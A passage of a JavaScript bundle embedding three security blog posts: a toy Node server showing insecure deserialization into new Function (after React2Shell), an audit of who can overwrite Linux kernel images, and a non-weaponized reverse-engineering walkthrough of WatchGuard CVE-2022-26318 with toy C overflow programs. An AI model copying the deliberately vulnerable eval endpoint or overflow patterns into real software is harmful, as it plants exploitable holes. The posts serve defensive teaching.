      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,kv=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,xv=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
